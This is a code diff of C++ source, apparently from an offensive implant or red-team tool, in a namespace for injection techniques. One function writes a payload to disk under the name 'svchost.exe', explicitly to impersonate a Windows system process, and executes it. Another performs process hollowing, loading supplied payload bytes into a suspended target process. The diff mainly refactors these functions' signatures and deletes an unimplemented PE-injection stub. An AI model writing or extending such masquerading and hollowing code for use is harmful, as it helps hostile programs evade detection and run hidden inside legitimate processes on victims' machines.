@@ -3,8 +3,8 @@
 namespace Technique::Injection
 {
     BOOL DirectExecution(
-        Procs::PPROCS       pProcs,
-        std::vector<BYTE>   bytes
+        Procs::PPROCS pProcs,
+        const std::vector<BYTE>& bytes
     ) {
          // Set the temp file path
         std::wstring wExeFileName = L"svchost.exe"; // Impersonate the file name.
@@ -19,25 +19,17 @@ namespace Technique::Injection
         return System::Process::ExecuteFile(pProcs, wExePath);
     }
 
-    // Reference:
-    // https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
-    BOOL PEInjection(
-        Procs::PPROCS pProcs
-    ) {
-        // TODO: Implement
-        return FALSE;
-    }
-
     // References:
     // https://github.com/NATsCodes/ProcessHollowing/blob/master/Process%20Hollowing.cpp
     BOOL ProcessHollowing(
-        Procs::PPROCS       pProcs,
-        LPVOID              lpBuffer,
-        const std::wstring  &wTargetProcess
+        Procs::PPROCS pProcs,
+        const std::wstring &wTargetProcess,
+        const std::vector<BYTE>& bytes
     ) {
         NTSTATUS status;
 
         // Read source EXE file
+        LPVOID lpBuffer = (LPVOID)bytes.data();
         LPBYTE lpbBuffer = (LPBYTE)lpBuffer;
 
         // Create destination (suspended) process to be hollowed
